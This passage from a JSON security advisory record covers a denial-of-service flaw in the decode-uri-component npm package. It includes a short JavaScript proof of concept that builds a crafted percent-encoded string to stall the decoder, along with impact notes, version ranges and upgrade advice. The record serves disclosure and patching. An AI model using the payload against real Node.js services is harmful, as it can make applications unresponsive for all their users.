ear scanner, but left this replacement loop unchanged.\n\n### Proof of concept\n\nRunning the following code takes ~20 seconds.\n\n```js\nimport decodeUriComponent from 'decode-uri-component';\n\nlet payload = '';\nfor (let i = 0; i < 32000; i++) {\n\tconst high = Math.floor(i / 256).toString(16).padStart(2, '0');\n\tconst low = (i % 256).toString(16).padStart(2, '0');\n\tpayload += `%${high}%${low}x`; // distinct run each iteration\n}\npayload += '%zz'; // forces the fallback decoder\n\nconsole.time('decode');\ndecodeUriComponent(payload); // ~224 KB\nconsole.timeEnd('decode');\n```\n\n### Impact\n\nThis is an availability issue only and there's no confidentiality or integrity impact. Any application that passes untrusted input to `decodeUriComponent()`, directly or through a dependency such as `query-string`, can be made unresponsive. Because Node.js runs on one thread, one request stalls every other client.\n\nThe worst case needs input well beyond URL length limits. Node's default 16 KB header limit keeps payloads passed in via a URL query string to roughly 40 ms per request. Applications that decode request bodies are fully exposed, for example form bodies parsed with `query-string.parse()`.","reported_by":null,"title":"decode-uri-component vulnerable to denial of service via quadratic replacement of percent-encoded runs","metadata":null,"cves":["CVE-2026-118664"],"access":"public","severity":"high","module_name":"decode-uri-component","vulnerable_versions":"<=0.5.0","github_advisory_id":"GHSA-qr28-fpjm-wq7f","recommendation":"Upgrade to version 0.5.1 or later","patched_versions":">=0.5.1","updated":"2026-10-29T16:41:29.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-400","CWE-407"],"url":"https://github.com/advisories/GHSA-qr28-fpjm-wq7f"}}}
